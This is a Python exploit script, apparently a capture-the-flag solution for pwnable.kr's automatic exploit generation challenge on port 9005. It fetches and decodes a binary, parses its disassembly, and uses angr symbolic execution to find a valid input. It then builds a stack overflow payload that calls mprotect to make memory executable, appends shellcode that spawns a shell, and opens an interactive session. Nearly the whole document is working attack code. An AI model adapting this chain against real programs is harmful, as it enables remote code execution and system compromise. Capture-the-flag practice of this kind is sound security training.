from pwn import *
import re
import os
import subprocess
import angr
import time
import claripy

def get_addr():
	data = subprocess.check_output(['objdump', '-S', '-M', 'intel', 'file'])
	addr = dict()
	hex_reg = '([0-9a-f]*)'

	# Segment
	reg = '<puts@plt>\n.{0,1024}?<puts@plt>\n'
	seg = re.search(reg, data, flags=re.DOTALL).group(0)
	# start addr
	addr['start'] = int( re.search(hex_reg +':', seg).group(1), 16 )
	# buf addr
	buf = re.findall('movzx  eax,.*?# ' + hex_reg, seg)
	addr['buf'] = min(map(lambda x: int(x, 16), buf))
	# avoid
	addr['avoid'] = int( re.search(hex_reg + ':', seg.split('\n')[-3]).group(1) ,16 )
	# target
	addr['target'] = int( re.search('\n(.*)?<memcpy@plt>:', data).group(1), 16 )
	# padding
	tmp = re.search('xor.{0,1024}?.xor.*?\n', data, flags=re.DOTALL).group(0)
	tmp = re.findall('xor.*?,.*?\n', tmp)
	tmp = map(lambda x: x.split(',')[-1], tmp)
	tmp = map(lambda x: int(x,16)  % 0xff, tmp)
	addr['padding'] = map(chr, tmp)
	# load
	tmp = re.search(hex_reg + ':.*?mov.*?rdi,QWORD PTR \[rbp-0x' + hex_reg, data)
	addr['load'] = int( tmp.group(1).lstrip('\n').rstrip(), 16 )
	addr['load_offset'] = int( tmp.group(2).lstrip('\n').rstrip(), 16 )
	# mprotect
	addr['mprotect'] = int( re.search(hex_reg + ' <mprotect@plt>', data).group(1).lstrip('\n').rstrip(), 16 )
	# buf_size
	addr['buf_size'] = int( re.search('lea    rax,\[rbp-0x' + hex_reg + '\]', data, flags=re.DOTALL).group(1), 16 )
	# buf_location
	addr['buf_location'] = addr['buf'] + addr['buf_size'] + 32
	return addr


if __name__ == '__main__':
	context(arch = 'amd64')

	os.system("rm code")
	os.system("rm file")

	p = remote("pwnable.kr", 9005)
	p.recvuntil("wait...\n")
	data = p.recvline()
	t = time.time()
	with open('code', 'w') as f:
		f.write(data)

	os.system("base64 -d code | gunzip > file")
	addr = get_addr()

	for i in addr.keys():
		try:
			print '[%s] : 0x%x' % (i, addr[i])
		except:
			print '[%s] : %s' % (i, str(addr[i]))

	ang = angr.Project('file')
	claripy = claripy.BVS('buf', 48*8)
	state = ang.factory.blank_state(addr=addr['start'])
	state.memory.store(addr['buf'], claripy)

	state.regs.rbp = state.regs.rsp
	state.regs.rsp = state.regs.rsp - 0x50
	state.memory.store(state.regs.rsp, state.se.BVV(0, 8*0x32))

	pg = ang.factory.path_group(state)
	def step_func(pg):
		pg.drop(filter_func = lambda x: x.addr == addr['avoid'])
		pg.stash(filter_func = lambda x: x.addr == addr['target'], from_stash = 'active', to_stash = 'found')
		return pg
	pg.step(step_func = step_func, until = lambda x: len(x.found) > 0)

	tmp = pg.found[0]
	cert = tmp.state.se.any_str(claripy)

	##########################################################################################################################

	mprotect = addr['buf_location'] + 0x200
	shell = addr['buf_location'] + 0x300

	pay = "A" * addr['buf_size']
	pay += p64(mprotect + addr['load_offset'])
	pay += p64(addr['load'])

	page = shell & 0xfffffffffffff000

	pay += "A"*(0x200 - len(pay))
	pay += p64(page)
	pay += p64(0x1337) * 2
	pay += p64(0x10000)
	pay += p64(0X7)
	pay += p64(page)

	pay += "A"*(addr['load_offset'] - 0x30)
	pay += p64(addr['buf_location'] + 0x600)
	pay += p64(addr['mprotect'])
	pay += p64(shell)

	pay += "A"*(0x300 - len(pay))
	pay += asm(shellcraft.sh())

	pay = xor(cert + pay, addr['padding'], cut='max')
	print '-'*50
	print "[Pay] : %s" % pay.encode('hex')
	print '-'*50
	print time.time() - t
	print '-'*50
	p.sendline(pay.encode('hex'))
	p.interactive()
